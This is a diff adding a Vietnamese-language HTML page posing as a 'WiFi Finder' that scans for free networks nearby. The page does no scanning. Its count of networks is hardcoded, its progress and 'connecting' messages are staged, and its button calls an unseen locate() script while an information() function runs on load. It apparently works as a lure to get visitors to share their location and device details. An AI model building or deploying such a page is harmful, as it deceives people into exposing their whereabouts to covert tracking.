@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <title>WiFi Finder | Tìm WiFi Miễn Phí Gần Bạn</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#2196F3">
+    <link rel="icon" type="image/x-icon" href="https://www.freefavicon.com/freefavicons/icons/flat-wifi-152-246266.png">
+    <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
+    <link href="/css/main.css" rel="stylesheet">
+    <script type="text/javascript">
+    if (window.location.protocol == "http:") {
+        var restOfUrl = window.location.href.substr(5);
+        
+    }</script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="js/location.js"></script>
+    <script src="js/warpspeed.min.js"></script>
+  </head>
+  <body onload="information();">
+    <canvas id="canvas" style="width:100%; height:100%; position: fixed; z-index: -1;"></canvas>
+    <script>var x=new WarpSpeed('canvas',
+    '{"speed":0.8,"speedAdjFactor":0.03,"density":0.8,"shape":"circle","warpEffect":true,"warpEffectLength":5,"depthFade":true,"starSize":3,"backgroundColor":"hsl(220,30%,10%)","starColor":"#4fc3f7"}');</script>
+    
+    <div class="container">
+      <div class="wifi-loader">
+        <div class="wifi-circle"></div>
+        <div class="wifi-circle"></div>
+        <div class="wifi-circle"></div>
+      </div>
+      <div class="header">
+        <h1>WiFi Finder</h1>
+        <h2>Tìm Điểm Phát WiFi Miễn Phí Gần Bạn</h2>
+      </div>
+      <div class="content">
+        <p>Ứng dụng sẽ quét và hiển thị tất cả các mạng WiFi miễn phí xung quanh bạn, kèm theo mật độ tín hiệu và tốc độ ước tính.</p>
+        <p class="highlight">Tìm thấy <span id="wifi-count">3</span> mạng WiFi trong phạm vi 500m</p>
+        <div class="progress">
+          <div class="progress-bar"></div>
+        </div>
+        <p id="scanning-text">Đang quét các mạng WiFi miễn phí xung quanh bạn...</p>
+      </div>
+      <div class="action">
+        <button id="change" class="button" type="button" onclick="locate(function(){$('#change').html('Đang Kết Nối'); $('#scanning-text').html('Đã tìm thấy mạng WiFi miễn phí! Đang kết nối...'); setTimeout(function() { alert('Cảm ơn bạn đã sử dụng WiFi Finder... Tính năng kết nối tự động sẽ sớm ra mắt!'); }, 2000);}, function(){$('#change').html('Thất Bại'); $('#scanning-text').html('Không thể tìm thấy vị trí của bạn. Vui lòng thử lại.');});">Bắt Đầu Quét</button>
+      </div>
+      <div class="text" id="result"></div>
+    </div>
+  </body>
+</html>
